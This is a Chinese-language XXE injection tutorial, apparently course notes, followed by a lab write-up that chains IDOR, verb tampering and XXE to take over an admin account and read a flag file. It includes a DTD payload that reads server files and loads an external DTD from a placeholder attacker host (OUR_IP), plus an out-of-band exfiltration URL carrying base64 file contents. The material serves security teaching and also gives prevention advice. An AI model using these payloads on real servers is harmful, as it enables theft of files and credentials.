...
XML External Entity (XXE) Injection 漏洞是指未经适当清理或安全解析而从用户控制的输入中获取 XML 数据时发生的漏洞，这可能允许攻击者利用 XML 特性执行恶意操作。XXE 漏洞会对 Web 应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到导致后端服务器崩溃，因此 OWASP 将其列为[十大 Web 安全风险](https://owasp.org/www-project-top-ten/)之一。

## 1. 前置知识

### 1.1  XML介绍

Extensible Markup Language（XML）是一种通用的标记语言（类似于 HTML 和 SGML），旨在为各种应用程序中的数据和文档的灵活传输和存储而设计。XML 的重点不在于显示数据，而在于存储文档数据和表示数据结构。XML 文档由元素树构成，其中每个元素本质上都由一个 `tag` 表示，第一个元素称为 `root element`，而其他元素则称为 `child elements `。

这里我们看到一个表示电子邮件文档结构的基本 XML 文档示例：
...
以上示例展示了 XML 文档的一些关键元素，例如：

| 英文术语    | 中文释义                                                     | 示例                                       |
| ----------- | ------------------------------------------------------------ | ------------------------------------------ |
| Tag         | 标签：XML 文档中的键名，通常用 `</>` 符号包裹              | `<date>`                                 |
| Entity      | 实体：XML 变量，通常用 `&;` 符号包裹                       | `<`                                      |
| Element     | 元素：根元素或其子元素，值存储在开始标签与结束标签之间       | `<date>01-01-2022</date>`                |
| Attribute   | 属性：元素的可选配置项，定义在标签内，供 XML 解析器使用      | `version="1.0"` / `encoding="UTF-8"`   |
| Declaration | 声明：通常位于 XML 文档首行，定义解析时使用的 XML 版本与编码 | `<?xml version="1.0" encoding="UTF-8"?>` |

此外，部分字符会作为 XML 文档结构的一部分使用，例如 `<`、`>`、`&` 或 `"`。 因此，如果我们需要在 XML 文档中使用这些字符，应当将它们替换为对应的**实体引用**（如 `&lt;`、`&gt;`、`&amp;`、`&quot;`）。 最后，我们可以在 XML 文档中使用 `<!--` 和 `-->` 包裹注释内容，这一点与 HTML 文档类似。

### 1.2 XML DTD

XML Document Type Definition (DTD) 允许根据预定义的文档结构验证 XML 文档。预定义的文档结构可以在文档本身中定义，也可以在外部文件中定义。以下是我们之前看到的 XML 文档的示例 DTD：
...
正如我们所见，该 DTD 通过 ELEMENT 类型声明定义了根元素 `email`，并指明了其子元素。
随后，每个子元素也被逐一声明：其中部分元素同样包含子元素，而另一些则仅包含原始数据（由 `PCDATA` 标识）。

上述 DTD 可以直接放在 XML 文档中，紧接在第一行的 XML Declaration 之后。或者，也可以将其存储在外部文件（例如 email.dtd ）中，然后在 XML 文档中使用 SYSTEM 关键字引用，如下所示：
...
这与 HTML 文档定义和引用 JavaScript 和 CSS 脚本的方式非常相似。

### 1.3 XML 实体

我们也可以在 XML DTD 中定义自定义实体（即 XML 变量），以便对变量进行统一管理并减少重复数据。这可以通过 ENTITY 关键字实现，关键字后依次跟上实体名称和对应的值，具体用法如下：
...
定义好实体之后，就可以在 XML 文档中通过 & 符号开头、; 符号结尾的方式进行引用（例如 `&company;`）。当实体被引用时，XML 解析器会自动将其替换为对应的实体值。
而更关键的是，我们可以使用 SYSTEM 关键字引用外部 XML 实体，在该关键字后直接指定外部实体的路径，用法如下：
...
> 注意： 我们也可以使用 PUBLIC 关键字代替 SYSTEM 来加载外部资源，PUBLIC 通常用于公开声明的实体和标准，例如语言代码（ lang="en" ）。在本模块中，我们将使用 SYSTEM ，但在大多数情况下，两者都可以使用。

这种方式与在文档内定义的内部 XML 实体用法类似。当我们引用一个外部实体（例如 ` &signature;`）时，解析器会将该实体替换为外部文件（例如 signature.txt）中存储的内容。
**当 XML 文件在服务端被解析时（比如在 SOAP（XML）接口或 Web 表单场景下），外部实体可以引用后端服务器上的文件，而当我们引用该实体时，这些文件内容最终可能会被泄露出来。**

## 2 本地文件披露

当 Web 应用程序直接接收并解析用户提交的、未做过滤处理的 XML 数据时，我们就可以通过引用外部 XML DTD 文档，自行定义新的 XML 实体。
如果我们定义的这些实体内容，能够在网页上正常显示出来，那么我们就能进一步构造特殊的外部实体，让它去读取服务器上的本地文件，最终在页面上看到该文件的内容。

### 2.1 识别漏洞

让我们看看如何识别潜在的 XXE 漏洞并利用它们从后端服务器读取敏感文件。

识别潜在 XXE 漏洞的第一步是找到接受 XML 用户输入的网页。我们可以从下面的 Contact Form 开始：

![1774543484533](images/WebAttacks/1774543484533.png)

如果我们填写联系表单并点击 Send Data ，然后用 Burp 拦截 HTTP 请求，我们会得到以下请求：![1774543497682](images/WebAttacks/1774543497682.png)

正如我们所见，该表单似乎以 XML 格式将数据发送到 Web 服务器，这使其成为潜在的 XXE 测试目标。
假设 Web 应用程序使用了过时的 XML 库，并且没有对我们的 XML 输入应用任何过滤或清理措施。在这种情况下，我们或许可以利用此 XML 表单读取本地文件。

如果我们不做任何修改就发送表格，会收到以下消息：![1774543605114](images/WebAttacks/1774543605114.png)

我们可以看到，email 元素的内容会在页面上回显出来。想要让外部文件的内容显示在页面中，我们需要先确认哪些元素会被页面展示，以此确定该向哪个元素注入恶意代码。在部分场景下，页面不会回显任何元素内容，针对这种情况的利用方法，我们会在后续章节中详细讲解。

目前我们知道，无论在 <email></email> 元素中设置什么值，都会显示在 HTTP 响应中。因此，让我们尝试定义一个新的实体，然后将其用作 email 元素中的变量，看看它是否会被替换为我们定义的值。为此，我们可以利用上一节中学到的关于定义新的 XML 实体的知识，并在 XML 输入的第一行之后添加以下几行：
...
> 注意： 在我们的示例中，HTTP 请求中的 XML 输入本身没有声明 DTD，也没有外部引用 DTD，因此我们在定义实体之前添加了一个新的 DTD。如果 XML 请求中已经声明了 DOCTYPE ，我们只需将 ENTITY 元素添加到其中即可。

现在我们已经创建了一个名为 company 的全新 XML 实体，可以通过 `&company; `来引用它。接下来，我们不在 email 元素中填写自己的邮箱，而是替换为 `&company;`，看看它是否会被解析成我们预先定义的内容（Inlane Freight）。

![1774543892321](images/WebAttacks/1774543892321.png)

可以看到，服务器返回的内容直接显示了我们定义的实体值（`Inlane Freight`），而不是原样显示 &company;，这说明我们可以注入 XML 代码。反之，不存在漏洞的应用会直接把 `&company; `当作普通文本展示出来。这就可以确认，当前这个 Web 应用存在 XXE 漏洞。

> 注意： 某些 Web 应用程序可能默认使用 JSON 格式发送 HTTP 请求，但也可能接受其他格式，包括 XML。因此，即使 Web 应用程序发送的是 JSON 格式的请求，我们也可以尝试将 Content-Type 标头更改为 application/xml ，然后使用[在线工具](https://www.convertjson.com/json-to-xml.htm)将 JSON 数据转换为 XML。如果 Web 应用程序确实接受了包含 XML 数据的请求，那么我们还可以对其进行 XXE 漏洞测试，这可能会发现意想不到的 XXE 漏洞。

### 2.2 读取敏感文件

既然我们已经可以定义新的内部 XML 实体，那么让我们看看是否可以定义外部 XML 实体。这与我们之前所做的非常相似，但我们只需添加 `SYSTEM`关键字，并在其后定义外部引用路径，正如我们在上一节中学到的那样：
...
现在让我们发送修改后的请求，看看外部 XML 实体的值是否被设置为我们引用的文件：

![1774544175954](images/WebAttacks/1774544175954.png)

我们可以看到，我们成功获取到了 /etc/passwd 文件的内容，这意味着我们已成功利用 XXE 漏洞读取了服务器本地文件。通过这种方式，我们可以读取各类敏感文件，例如可能包含密码的配置文件，或是特定用户的 SSH 私钥（id_rsa）等敏感文件，进而获取后端服务器的访问权限。关于本地文件泄露可实施的更多攻击手段，可参考[文件包含 / 目录遍历](https://academy.hackthebox.com/course/preview/file-inclusion)相关模块的内容。

> 提示： 在某些 Java Web 应用程序中，我们也可以指定目录而不是文件，这样就会得到目录列表，这对于查找敏感文件非常有用。

### 2.3 读取源代码

本地文件泄露的另一个好处是能够获取 Web 应用程序的源代码。这将使我们能够执行 Whitebox Penetration Test 从而发现 Web 应用程序中的更多漏洞，或者至少可以揭示数据库密码或 API 密钥等秘密配置。

那么，让我们看看是否可以使用相同的攻击方法来读取 index.php 文件的源代码，如下所示：

![1774544303300](images/WebAttacks/1774544303300.png)

可以看到，这种方法并没有生效，我们没有获取到任何内容。原因是我们引用的文件并非规范的XML格式，无法作为外部XML实体被正常解析。如果文件中包含XML的特殊字符（比如 `<`、`>`、`&`），会破坏外部实体的引用结构，导致引用失败。
此外，我们也无法读取任何二进制数据，因为这类数据同样不符合XML格式要求。

好在 PHP 提供了专用的过滤器包装器，支持对文件等资源进行 Base64 编码。经过编码后的内容不会包含 XML 特殊字符，也就不会破坏 XML 格式。要利用这个特性，我们不再使用 `file://`协议引用文件，而是改用 PHP 自带的 `php://filter/ `包装器。我们可以通过该过滤器指定 `convert.base64-encode`编码器，再传入需要读取的文件路径（例如 resource=index.php），具体用法如下：
...
这样，我们就可以发送请求，并获取 index.php 文件的 base64 编码字符串：![1774544472055](images/WebAttacks/1774544472055.png)

我们可以选中 base64 字符串，点击 Burp 的“检查器”选项卡（位于右侧面板），即可查看解码后的文件。有关 PHP 过滤器的更多信息，请参阅“ 文件包含/目录遍历” 模块。

这种技巧仅适用于基于 PHP 的 Web 应用。下一节我们会讲解一种读取源码的更高级方法，适用于各类 Web 框架。

## 3  高级文件披露

并非所有 XXE 漏洞都易于利用，正如我们在上一节中所看到的。某些文件格式可能无法通过基本的 XXE 读取，而在其他情况下，Web 应用程序可能不会输出任何输入值，因此我们可以尝试通过错误强制其执行。

### 3.1 使用 CDATA 进行高级数据窃取

在上一节中，我们了解了如何使用 PHP 过滤器对 PHP 源文件进行编码，使其在引用时不会破坏 XML 格式，从而避免因 XML 格式错误而导致的文件无法读取。但是对于其他类型的 Web 应用程序呢？我们可以使用另一种方法来提取任何 Web 应用程序后端的任何类型的数据（包括二进制数据）。要输出不符合 XML 格式的数据，我们可以用 CDATA 标签包裹外部文件引用的内容（例如 <![CDATA[ FILE_CONTENT ]]> ）。这样，XML 解析器会将这部分视为原始数据，其中可以包含任何类型的数据，包括任何特殊字符。

要解决这个问题，一个简单的方法是：先定义一个以 `<![CDATA[ `开头的内部实体，再定义一个以 `]]>`结尾的内部实体，然后把读取文件的外部实体放在这两者中间，这样内容就会被当作 CDATA 片段处理，示例如下：
...
在此之后，如果我们引用 `&joined;`实体，它本应包含我们转义处理后的文件数据。但这种方法无法生效，因为 XML 语法规则禁止拼接使用内部实体和外部实体，因此我们需要寻找更有效的解决方案。

要绕过这一限制，我们可以使用 `XML 参数实体`—— 这是一种以 % 符号开头、且仅能在 DTD 中使用的特殊实体类型。
参数实体的独特之处在于：如果我们从外部源（例如我们自己的服务器）引用它们，那么所有参数实体都会被判定为外部实体，从而可以进行拼接使用，具体用法如下：

```xml
<!ENTITY joined "%begin;%file;%end;">
```

所以，我们先将上述代码行存储在 DTD 文件（例如 xxe.dtd ）中，将其托管在我们的机器上，然后在目标 Web 应用程序中将其作为外部实体引用，以此来尝试读取 submitDetails.php 文件，如下所示：
...
现在，我们可以引用外部实体（ `xxe.dtd `），然后打印上面定义的 `&joined; `实体，该实体应该包含 `submitDetails.php` 文件的内容，如下所示：

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- 前置CDATA标签的开头 -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- 引用外部文件 -->
  <!ENTITY % end "]]>"> <!-- 追加CDATA标签的结尾 -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- 引用自定义的外部DTD文件 -->
  %xxe;
]>
...
<email>&joined;</email> <!-- 引用&joined;实体，输出文件内容 -->
```

一旦我们编写好 ` xxe.dtd` 文件，将其托管在我们的机器上，然后将上述代码添加到发送给存在漏洞的 Web 应用程序的 HTTP 请求中，我们最终就可以获取 submitDetails.php 文件的内容了：![1774545183230](images/WebAttacks/1774545183230.png)

正如我们所看到的，我们无需将其编码为 base64 即可获取文件的源代码，这在浏览各种文件以查找秘密和密码时节省了大量时间。

> 注意：在部分现代化 Web 服务器中，我们可能无法读取某些文件（如 index.php）。这是因为服务器会阻止由文件 / 实体自引用引发的拒绝服务（DOS）攻击（即 XML 实体引用循环），这一点我们在上一节中已经提及。

当基础的 XXE 利用方法失效，或是在使用其他 Web 开发框架时，这个技巧会非常实用。你可以尝试用它读取其他文件。

## 4. 基于错误的XXE

另一种可能的情况是，Web 应用程序不输出任何内容，因此我们无法控制任何 XML 输入实体来写入其内容。在这种情况下，我们将无法看到 XML 输出，因此无法使用常用方法检索文件内容。

如果 Web 应用会显示运行时错误（如 PHP 错误），且对 XML 输入没有完善的异常处理，我们就可以利用这一缺陷获取 XXE 漏洞利用后的输出结果。如果应用既不回显 XML 内容，也不抛出任何错误，我们就会遇到完全的盲注场景，相关利用方法将在下一节讲解。

### 4.1 利用web的错误信息

我们以本节末尾 /error 路径下的练习为例，该练习中所有 XML 输入的实体内容都不会显示在页面上。正因如此，我们没有可以控制的实体来输出文件内容。
首先，我们尝试发送格式错误的 XML 数据，查看 Web 应用是否会抛出错误信息。要实现这一点，我们可以删除任意一个闭合标签、修改标签导致无法配对（例如用 <roo> 代替 <root>），或者直接引用一个不存在的实体，示例如下：

![1774545467228](images/WebAttacks/1774545467228.png)

我们看到，我们确实成功地让 Web 应用程序显示了一个错误，并且还暴露了 Web 服务器目录，我们可以利用该目录读取其他文件的源代码。现在，我们可以利用这个漏洞窃取文件内容。为此，我们将使用与之前类似的技术。首先，我们将托管一个包含以下有效载荷的 DTD 文件：
...
上述攻击载荷定义了文件参数实体，随后将其与一个不存在的实体进行拼接。在之前的练习中，我们拼接了三个字符串；而在当前场景下，`%nonExistingEntity; `是不存在的，因此 Web 应用会抛出错误，提示该实体未定义，同时会把我们拼接的 %file;（文件内容）一并展示在错误信息中。除此之外，还有多种情况会触发报错，比如引用无效的 URI，或是被读取的文件中包含特殊字符等。

现在，我们可以调用外部 DTD 脚本，然后引用 error 实体，如下所示：
...
一旦我们像之前那样托管了 DTD 脚本，并将上述有效负载作为 XML 数据发送（无需包含任何其他 XML 数据），我们将获得 /etc/hosts 文件的内容如下：![1774545751562](images/WebAttacks/1774545751562.png)

这种方法也可以用来读取文件的源代码。我们只需修改 DTD 脚本中的文件路径，指向我们想要读取的目标文件即可（例如：file:///var/www/html/submitDetails.php）。不过，这种读取源码的方式不如之前的方法可靠，因为它可能存在长度限制，并且部分特殊字符仍会导致该方法失效。

### 4.2 带外数据泄露

在上一节中，我们看到了一个盲注 XXE 漏洞的示例，在这种情况下，我们没有收到任何包含 XML 输入实体的输出。由于 Web 服务器显示了 PHP 运行时错误，我们可以利用这个漏洞从显示的错误信息中读取文件内容。在本节中，我们将看到如何在完全盲注的情况下获取文件内容，即既没有 XML 实体的输出，也没有显示任何 PHP 错误。

我们无法在 Web 应用程序的响应中获取任何信息。对于这种情况，我们可以使用一种名为 Out-of-band (OOB) Data Exfiltration 的方法，这种方法常用于类似的盲注场景，例如盲注 SQL 注入、盲注命令注入、盲注 XSS 以及盲注 XXE。 跨站脚本攻击 (XSS) 和白盒渗透测试 101：命令注入这两个模块都讨论过类似的攻击，在这里我们将使用一种类似的攻击，并稍作修改以适应我们的 XXE 漏洞。

在之前的攻击中，我们采用了 带外攻击（Out-of-Band）的方式：将DTD文件托管在自己的服务器上，让目标Web应用主动发起请求连接我们，这就是带外攻击。

因此，本次的攻击思路与之前十分相似，只有一个关键区别：

我们不再让Web应用将文件实体的内容输出到某个XML节点中，而是让它直接把读取到的文件内容，通过HTTP请求发送回我们的服务器。

为此，我们可以先使用一个参数实体来存储要读取的文件内容，同时利用 PHP 过滤器对其进行 base64 编码。然后，我们将创建另一个外部参数实体，并将其指向我们的 IP 地址，并将 file 参数值作为 HTTP 请求 URL 的一部分，如下所示：
...
举个例子，如果我们想要读取的文件内容为 `XXE_SAMPLE_DATA`，那么 `file` 参数就会存储该内容的 Base64 编码结果（`WFhFX1NBTVBMRV9EQVRB`）。
当 XML 解析器尝试从我们的服务器引用外部 `oob` 参数时，会自动向地址 `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB` 发起请求。
最后，我们将编码字符串 `WFhFX1NBTVBMRV9EQVRB` 进行解码，就能得到文件的原始内容。
我们甚至可以编写一个简单的 PHP 脚本，自动识别编码后的文件内容、完成解码，并将结果输出到终端。
...
因此，我们首先将上述 PHP 代码写入 index.php 文件，然后在 8000 端口启动 PHP 服务器，如下所示：
...
现在，我们可以使用和之前报错型XXE攻击类似的攻击载荷来发起攻击，只需添加 `<root>&content;</root>` 即可。
这行代码用于引用我们定义的实体，让目标服务器将文件内容通过请求发送回我们的机器。
...
然后，我们可以向 Web 应用程序发送请求：![1774546227769](images/WebAttacks/1774546227769.png)

最后，我们可以回到终端，会看到我们确实收到了请求及其解码后的内容：
...
> 提示：除了将 Base64 编码后的数据作为 URL 参数传递之外，我们还可以使用 **DNS 带外数据泄露（DNS OOB Exfiltration）** 技术：把编码后的数据作为 URL 的子域名（例如 ENCODEDTEXT.our.website.com），再通过 tcpdump 这类工具捕获传入的网络流量，解码子域名中的字符串即可获取数据。诚然，这种方法更为高级，实现数据外带的操作也相对复杂。

## 5. 自动化工具

虽然在某些情况下我们可能需要使用前面学到的手动方法，但在许多其他情况下，我们可以使用工具自动执行盲 XXE 数据外泄过程。[XXEinjector ](https://github.com/enjoiz/XXEinjector)就是这样一款工具。该工具支持我们在本模块中学习的大部分技巧，包括基本 XXE、CDATA 源数据外泄、基于错误的 XXE 和盲 OOB XXE。

拿到工具后，我们可以从 Burp 复制 HTTP 请求并将其写入文件供工具使用。我们不应该包含完整的 XML 数据，只需要第一行，并在其后添加 ` XXEINJECT` 作为工具的位置定位符：
...
现在，我们可以运行该工具：通过 --host/--httpport 参数指定我们的 IP 地址和端口，--file 参数指定我们上文编写的文件，--path 参数指定我们想要读取的目标文件。我们还需要启用 --oob=http 和 --phpfilter 参数，来复现我们上文执行的带外（OOB）攻击，具体用法如下：
...
我们发现该工具并没有直接打印数据。这是因为我们对数据进行了 base64 编码，所以数据不会被打印出来。无论如何，所有提取的文件都会存储在工具目录下的 Logs 文件夹中，我们可以在那里找到我们的文件：
...
我们已经了解到，XXE 漏洞主要发生在不安全的 XML 输入引用外部实体时，攻击者最终会利用该漏洞读取敏感文件并执行其他操作。与其他 Web 漏洞相比，预防 XXE 漏洞相对容易，因为 XXE 漏洞主要由过时的 XML 库引起。

虽然其他输入验证方面的 Web 漏洞通常可以通过安全的编码实践来预防（例如，XSS、IDOR、SQL 注入、操作系统注入），但对于 XXE 漏洞，这并非完全必要。这是因为 XML 输入通常并非由 Web 开发人员手动处理，而是由内置的 XML 库处理。因此，如果 Web 应用程序存在 XXE 漏洞，很可能是由于解析 XML 数据的 XML 库版本过旧所致。

例如，PHP 的 libxml_disable_entity_loader 函数已被弃用，因为它允许开发者以不安全的方式启用外部实体，从而导致 XXE 漏洞。

> 注意： 您可以在 [OWASP 的 XXE 预防速查表](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php)中找到所有易受攻击的 XML 库的详细报告，以及有关更新它们和使用安全函数的建议。

除了更新 XML 库之外，我们还应该更新所有解析 XML 输入的组件，例如 SOAP 等 API 库。此外，任何可能执行 XML 解析的文档或文件处理器，例如 SVG 图像处理器或 PDF 文档处理器，也可能容易受到 XXE 漏洞的影响，我们也应该对其进行更新。

这类问题并非XML解析库独有，其他所有Web组件（例如过时的Node模块）也存在同样情况。
除了常见的包管理器（如npm），主流代码编辑器也会提示开发者所使用的组件已过时，并推荐替代方案。

总而言之，使用最新版本的XML库和Web开发组件，能够大幅减少包括XXE在内的各类Web漏洞。

除了使用最新的 XML 库之外，针对 Web 应用程序的某些 XML 配置也有助于降低 XXE 漏洞利用的可能性。这些配置包括：

* 禁用对自定义 Document Type Definitions (DTDs) 的引用
* 禁用对 External XML Entities 引用
* 禁用 Parameter Entity 处理
* 禁用对 XInclude 支持
* 防止 Entity Reference Loops

我们还学习了**报错型XXE利用**技术。因此，我们必须在Web应用中实现完善的异常处理机制，并且在Web服务器上**禁用运行时错误的展示功能**。

如果某些 XML 库未能及时更新，此类配置可以提供额外的保护层，并能防止 XXE 漏洞利用。然而，在这种情况下，我们可能仍然在使用存在漏洞的库，而仅仅采取一些权宜之计来应对漏洞利用，这并非理想之选。

鉴于XML数据会引发各类安全问题与漏洞，许多安全建议也推荐改用其他数据格式，例如 JSON 或 YAML。
这同时也包括避免使用基于XML的API协议（如SOAP），转而采用基于JSON的API架构（如REST）。

最后，使用 Web 应用防火墙（WAF）是抵御 XXE 攻击的另一层保护。但是，我们绝不能完全依赖 WAF 而使后端处于易受攻击的状态，因为 WAF 总是可以被绕过的。


# 五. 网络攻击——技能评估

您正在为一家软件开发公司执行 Web 应用程序渗透测试，他们委托您测试其社交网络 Web 应用程序的最新版本。请尝试运用您在本模块中学到的各种技术，识别并利用 Web 应用程序中发现的多个漏洞。

## writeup

当我们访问该网站时，会看到以下页面：![1774546859039](images/WebAttacks/1774546859039.png "登陆界面")

因为这是关于 Web 攻击的，所以我们启动 Burpsuite 并拦截请求。我喜欢向 Repeater 发送一些看起来很有希望的请求，这样以后我就可以进行一些测试。

![1774546916509](images/WebAttacks/1774546916509.png "登陆 请求/响应")

我们看到set-cookie中的 uid=74 ,我们现在看到的网页如下：

![1774547002433](images/WebAttacks/1774547002433.png "profile.php")

我们还会收到以下请求，该请求为我们提供更多关于用户的信息：![1774547040973](images/WebAttacks/1774547040973.png)

现在让我们进入页面设置，看看我们可以在那里做些什么。我们可以更改当前用户的密码, 提交新密码时，我们会再次收到一个请求，该请求会返回当前用户的令牌。

![1774547110190](images/WebAttacks/1774547110190.png)![1774547132103](images/WebAttacks/1774547132103.png)

如前所述，我们可以看到 uid 为 74，这意味着可能还有更多用户，也可能存在拥有更高权限的用户。

我们向其发送用户信息请求，并在原本包含用户 ID 的位置添加一个有效负载。该有效负载应为一个简单的列表，范围从 1 到 100。除了这个简单列表之外，我们还应该在响应中搜索关键词“admin”或“Administrator”。![1774547186603](images/WebAttacks/1774547186603.png)

我们可以看到，uid=52 与我们设定的关键词匹配成功：![1774547206798](images/WebAttacks/1774547206798.png)

现在，我们可以使用 Repeater 来获取管理员的令牌:![1774547227644](images/WebAttacks/1774547227644.png)

我们拦截更改密码的提交请求，并相应地将 uid 和 token 更改为管理员的 uid 和 token，然后发送请求。

正如我们所看到的，访问被拒绝了。

由于安全措施薄弱，我们可以将方法从 POST 改为 GET 来绕过这个问题。

![1774547280123](images/WebAttacks/1774547280123.png)

现在让我们注销，以便使用我们设置的密码以管理员身份登录。![1774547299080](images/WebAttacks/1774547299080.png)

我们看到已成功以管理员身份登录。我们还看到页面上新增了一个功能（添加事件）。![1774547339499](images/WebAttacks/1774547339499.png)

如果我们拦截添加新事件的操作，我们将收到以下请求。![1774547355349](images/WebAttacks/1774547355349.png)

我们看到输入之间的<name>解析结果会返回到响应中，如果安全措施薄弱，我们可以利用这一点。

我们将进行 XXE（XML 外部实体）注入，目的是读取文件的源代码。在本例中，目标是 /flag.php 文件。

![1774547392752](images/WebAttacks/1774547392752.png)
